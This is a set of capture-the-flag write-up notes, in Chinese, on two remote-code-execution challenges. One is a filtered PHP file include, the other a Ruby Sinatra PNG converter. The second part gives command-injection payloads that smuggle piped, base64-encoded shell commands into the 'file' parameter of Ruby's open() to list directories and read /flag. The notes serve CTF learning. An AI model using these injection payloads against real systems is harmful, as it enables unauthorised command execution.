题型:RCE

漏洞原因:include $_GET\['file'];

```php+HTML

function filter($var): bool{
    $banned = ["while", "for", "\$_", "include", "env", "require", "?", ":", "^", "+", "-", "%", "*", "`"];

    foreach($banned as $ban){
        if(strstr($var, $ban)) return True;
    }

    return False;
}

function checkNums($var): bool{
    $alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $cnt = 0;
    for($i = 0; $i < strlen($alphanum); $i++){
        for($j = 0; $j < strlen($var); $j++){
            if($var[$j] == $alphanum[$i]){
                $cnt += 1;
                if($cnt > 8) return True;
            }
        }
    }
    return False;
}
?> 
```

应该是要使用不超过8个`[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ]`内字符并且不包含`["while", "for", "\$_", "include", "env", "require", "?", ":", "^", "+", "-", "%", "*", "`"]`且小于15个字符进行webshell

由于session的参数可以查看

`session.upload_progress.enabled`:上传文件时可以把文件上传的进度和信息存储在session中

`session.upload_progress.cleanup`:文件上传结束后,php会立即清空对应session中的内容

条件竞争漏洞:https://blog.csdn.net/qq_48904485/article/details/123642632

`session.save_path`:可以看到session文件保存路径，一般在/tmp/下生成一个sess_xxxx的文件

`session.use_strict_mode`:关闭说明用户可以自定义sessionid 即session文件名为sess_sessionid

## PNG图片转换器

题型:RCE 代码审计

漏洞原因:res = open(file, 'r').read()     "var img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64," + Base64.encode64(res).gsub(/\s*/, '') + "\";\n"

```ruby
require 'sinatra'
require 'digest'
require 'base64'

get '/' do
  open("./view/index.html", 'r').read()
end

get '/upload' do
  open("./view/upload.html", 'r').read()
end

post '/upload' do
  unless params[:file] && params[:file][:tempfile] && params[:file][:filename] && params[:file][:filename].split('.')[-1] == 'png'
    return "<script>alert('error');location.href='/upload';</script>"
  end
  begin
    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + '.png'
    open(filename, 'wb') { |f|
      f.write open(params[:file][:tempfile],'r').read()
    }
    "Upload success, file stored at #{filename}"
  rescue
    'something wrong'
  end

end

get '/convert' do
  open("./view/convert.html", 'r').read()
end

post '/convert' do
  begin
    unless params['file']
      return "<script>alert('error');location.href='/convert';</script>"
    end

    file = params['file']
    unless file.index('..') == nil && file.index('/') == nil && file =~ /^(.+)\.png$/
      return "<script>alert('dont hack me');</script>"
    end
    res = open(file, 'r').read()
    headers 'Content-Type' => "text/html; charset=utf-8"
    "var img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64," + Base64.encode64(res).gsub(/\s*/, '') + "\";\n"
  rescue
    'something wrong'
  end
end
```

对/upload的处理：需要上传一个后缀为.png的图片 上传成功便把文件名改成时间戳+文件名的md5值

对/convert的处理：过滤文件名 将图片内容进行base64加密进行输出【若图片内容是一条命令 那么命令执行结果将会被进行base64编码】

`ls /`=>base64=>`bHMgLw==`

用反引号包含的输出语句会被当做指令直接执行

```
`echo [cmd]` ==> system([cmd])
```

```
|`echo bHMgLw== | base64 -d` ==> ls /
```

`|`管道符，上一条命令的输出，作为下一条命令参数

```
file=|`echo bHMgLw== | base64 -d` > [md5].png
//查看回显 可以看到经base64编码后的目录
file=|`echo base64[cat /flag] | base64 -d` > [md5].png
//回显经base64解码
```
